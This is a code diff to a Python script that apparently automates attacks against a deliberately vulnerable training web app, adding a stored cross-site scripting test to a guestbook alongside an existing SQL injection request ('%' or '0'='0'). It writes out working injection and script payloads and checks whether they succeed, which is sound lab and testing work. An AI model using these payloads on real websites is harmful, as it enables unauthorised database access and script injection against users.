@@ -78,17 +78,55 @@ def test_SQL_Injection_1(mSession):
     #Basic 
     #SQL Standard
     print ("\n---------------------\n$$-Getting SQLInjectionLesson-$$\n---------------------")
+    print("   Initial Get")
     responseA = mSession.get(mURL + "vulnerabilities/sqli/?id=1&Submit=Submit")
     printPacket(responseA, False)
     print("Response Count: ",  len(responseA.html.find("pre")), "\n")
     stCount = len(responseA.html.find("pre"))
     #SQL Attack
+    print("   SQL Attack")
     attackA = mSession.get(mURL + "vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit")
     printPacket(attackA, False)
     print("Response Count: ",  len(attackA.html.find("pre")))
     atckCount=len(attackA.html.find("pre"))
     #Need to id how to get actual resposne
     attackList.append(Attack("SQL_A", attackA.url, attackA.status_code, atckCount > stCount))
+    
+
+
+def test_CSS_Attack_1(mSession):
+    print ("\n---------------------\n$$-Getting XSS Attack-$$\n---------------------")
+    
+    #Clear Guestbook
+    payloadClear = {
+        "txtName": "",
+        "mtxMessage": "",
+        "btnClear":"Clear Guestbook"
+    }    
+    clearResp = mSession.post(mURL + "vulnerabilities/xss_s/", data=payloadClear)    
+    print("   Clear Guestbook")
+    printPacket(clearResp, False)
+    print("Response Count: ",  len(clearResp.html.find("#guestbook_comments")), "\n")
+    
+
+    #Post XSS message
+    payloadAttack = {
+        "txtName": "Hax Test",
+        "mtxMessage": "<script>assert('Hacked by HaxBox')</script>",
+        #"mtxMessage": "<script>document.getElementByID('#guestbook_comments').classList.add('Haxed')</script>",
+        "btnSign":"Sign Guestbook"
+    }    
+    attackResp = mSession.post(mURL + "vulnerabilities/xss_s/", data=payloadAttack) 
+    print("   XSS Attack") 
+    printPacket(attackResp, False)
+    #Verify >0 response with script in guestbook
+    gbEntries = len(attackResp.html.find("#guestbook_comments"))
+    print("Response Count: ",  len(attackResp.html.find("#guestbook_comments")), "\n")
+    Success = ("Name: Hax Test<br />Message: <script>assert('Hacked by HaxBox')</script>" in attackResp.text)
+
+    #Document attack
+    attackList.append(Attack("XSS_A", attackResp.url, attackResp.status_code, gbEntries == 1 and Success))
+
 
 def main():
     #Carry out attacks
@@ -96,7 +134,7 @@ def main():
     session = HTMLSession()
     login(session)
     test_SQL_Injection_1(session)
-    #test_SQL_Injection_2(session)
+    test_CSS_Attack_1(session)
     
     #Print results
     print("\n---------------------\nTest Results\n---------------------")
